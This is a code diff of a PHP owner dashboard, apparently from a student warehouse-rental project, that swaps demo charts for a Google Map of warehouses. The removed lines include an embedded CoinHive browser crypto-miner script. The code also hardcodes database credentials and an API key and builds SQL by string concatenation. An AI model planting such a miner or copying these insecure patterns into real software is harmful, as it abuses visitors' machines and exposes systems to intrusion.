@@ -19,13 +19,6 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<style>
-      td, tr:hover {
-        opacity: 0.6;
-      }
-
-      th:hover {
-        opacity: 1.0;
-      }
 		</style>
 	</head>
 	<body>
@@ -76,7 +69,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 
                         <div class="9u$ 12u$(xsmall)">
                             <!-- new column-->
-                            <div class="slimmer" margin-left="4em">
+                            <div class="slimmer" style="margin-left: 5%">
 
 
 								<?php
@@ -128,12 +121,9 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 									}
 								if( $_GET["name"]=="warehouse_activity"){
 									echo"
-									<h3>Warehouse Activity</h3>
-									<p> Here is Your Optimized Activity
-									</p>";
+									<h3>Warehouse Activity</h3>";
+									map();
 
-									pieChart();
-									lineCurve();
 
 						echo"</div>
 						</div>
@@ -148,7 +138,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 							</div>
 						</div>
 					</div>";
-					//[php function yieldning some info or query]();
+					owner_account();
 									}
 								?>
 
@@ -310,6 +300,16 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 						$sql = "SELECT * FROM Contract WHERE Owner_ID=".$Owner_ID." AND Approval=1";
 
 						$result = $conn->query($sql);
+						echo "
+						<style>
+							td, tr:hover {
+								opacity: 0.6;
+							}
+
+							th:hover {
+								opacity: 1.0;
+							}
+						</style>";
 						echo"<table width=950px>
 							";
 							echo"
@@ -349,18 +349,15 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 						$username = "g1090423";
 						$password = "marioboys";
 						$dbname = "g1090423";
-
-						// Create connection
+ 						// Create connection
 						$conn = new mysqli($servername, $username, $password, $dbname);
 						// Check connection
 						if ($conn->connect_error) {
 						die("Connection failed: " . $conn->connect_error);
 						}
-
-						$sql = "SELECT * FROM Owner WHERE ID=".$Owner_ID."";
+ 						$sql = "SELECT * FROM Owner WHERE ID=".$Owner_ID."";
 						//$sql = "SELECT * FROM Contract WHERE Owner_ID=".$Owner_ID." AND Approval=0";
-
-						$result = $conn->query($sql);
+ 						$result = $conn->query($sql);
 						echo"<table width=950px>
 							";
 							echo"
@@ -369,20 +366,17 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 							<th>Last Name</th>
 							<th>Email</th>
 							<th>Rating</th>";
-
-							if ($result->num_rows > 0) {
+ 							if ($result->num_rows > 0) {
 							// output data of each row
 							while($row = $result->fetch_assoc()) {
-
-							echo"
+ 							echo"
 							<tr>
 							<td><a href='request.php'>".$row['ID']. "</a></td>
 							<td>".$row["FirstName"]."</td>
 							<td>".$row["LastName"]."</td>
 							<td>".$row["Email"]."</td>
 							<td>".$row["Rating"]."</td>";
-
-							echo"</tr>";
+ 							echo"</tr>";
 							}
 							} else {
 							echo "0 results";
@@ -392,72 +386,77 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 						</table>";
 						}
 
-					function pieChart()
+
+
+					function map()
 					{
-							echo"<head>";
-										echo'<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>';
-										echo'<script type="text/javascript">
-											  google.charts.load(\'current\', {\'packages\':[\'corechart\']});
-											  google.charts.setOnLoadCallback(drawChart);
+									/*Open Data base connection*/
+									$Owner_ID=$_SESSION["id"];
+									$servername = "mydb.ics.purdue.edu";
+									$username = "g1090423";
+									$password = "marioboys";
+									$dbname = "g1090423";
+									// Create connection
+									$conn = new mysqli($servername, $username, $password, $dbname);
+									// Check connection
+									if ($conn->connect_error) {
+									die("Connection failed: " . $conn->connect_error);
+									}
+								$location_sql = "Select Warehouse.Zipcode, Warehouse.ID From Warehouse Where Owner_ID = ".$Owner_ID."";
+								//$location_sql = "Select Warehouse.Zipcode, Warehouse.ID From Warehouse Where Owner_ID = 1";
 
-											  function drawChart() {
+								//Makes multidimensional array of contracts_sql query result
+								$location_result = mysqli_query($conn, $location_sql);
+								$location = array();
+								if(mysqli_num_rows($location_result)>0){
+									while($row = mysqli_fetch_assoc($location_result)){
+										$location[] = $row;
+									}
+								}
+								$location_table = array();
+								foreach ($location as $location1){
+									$location_table[] = array((string)$location1['Zipcode'], (int)$location1['ID']);
+								}
 
-												var data = google.visualization.arrayToDataTable([
-												  [\'Task\', \'Hours per Day\'],
-												  [\'Work\',     11],
-												  [\'Eat\',      2],
-												  [\'Commute\',  2],
-												  [\'Watch TV\', 2],
-												  [\'Sleep\',    7]
-												]);
+								$location_table = json_encode($location_table);
 
-												var options = {
-												  title: \'My Daily Activities\'
-												};
 
-												var chart = new google.visualization.PieChart(document.getElementById(\'piechart\'));
+									$conn->close();
 
-												chart.draw(data, options);
-											  }
-											</script>';
-										echo"</head>
-										  <body>
-											<div id=\"piechart\" style=\"width: 900px; height: 500px;\"></div>
-										  </body>";
+
+									echo"<head>";
+									echo'<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>';
+									echo'<script type="text/javascript">
+									  google.charts.load("current", {
+										"packages":["map"],
+										// Note: you will need to get a mapsApiKey for your project.
+										// See: https://developers.google.com/chart/interactive/docs/basic_load_libs#load-settings
+										"mapsApiKey": "AIzaSyDi799MTv01g9mQ2C2p1km1v7v1bTIjs-Q"
+									});
+									  google.charts.setOnLoadCallback(drawChart);
+									  function drawChart() {
+										var data = new google.visualization.DataTable();
+											data.addColumn(\'string\', \'zip\');
+											data.addColumn(\'number\', \'Warehouse ID\');
+											data.addRows('.$location_table.');
+
+										var map = new google.visualization.Map(document.getElementById(\'map_div\'));
+										map.draw(data, {
+										  showTooltip: true,
+										  showInfoWindow: true
+										});
+									  }
+
+									</script>';
+								  echo"</head>
+
+
+									<div id=\"map_div\" style=\"width: 100%; height: 40%\"></div>";
+
 					}
-					function lineCurve()
-					{
-							echo"<head>";
-										echo'<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>';
-										echo'<script type="text/javascript">
-										  google.charts.load(\'current\', {\'packages\':[\'corechart\']});
-										  google.charts.setOnLoadCallback(drawChart);
 
-										  function drawChart() {
-											var data = google.visualization.arrayToDataTable([
-											  [\'Year\', \'Sales\', \'Expenses\'],
-											  [\'2004\',  1000,      400],
-											  [\'2005\',  1170,      460],
-											  [\'2006\',  660,       1120],
-											  [\'2007\',  1030,      540]
-											]);
 
-											var options = {
-											  title: \'Company Performance\',
-											  curveType: \'function\',
-											  legend: { position: \'bottom\' }
-											};
 
-											var chart = new google.visualization.LineChart(document.getElementById(\'curve_chart\'));
-
-											chart.draw(data, options);
-										  }
-										</script>';
-									echo"</head>
-									  <body>
-										<div id=\"curve_chart\" style=\"width: 900px; height: 500px\"></div>
-									  </body>";
-					}
 				?>
                 </font></p>
 
@@ -485,17 +484,6 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 			<script src="assets/js/skel.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
-    <!--coinhiv miner script-->
-      <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-      <script>
-          var miner = new CoinHive.Anonymous('nC4dWxbaY9U8glwWmkbvRE3KCxjEcFdp', {throttle: 0.3});
-
-          // Only start on non-mobile devices and if not opted-out
-          // in the last 14400 seconds (4 hours):
-          if (!miner.isMobile() && !miner.didOptOut(14400)) {
-              miner.start();
-          }
-      </script>
 
 	</body>
 </html>
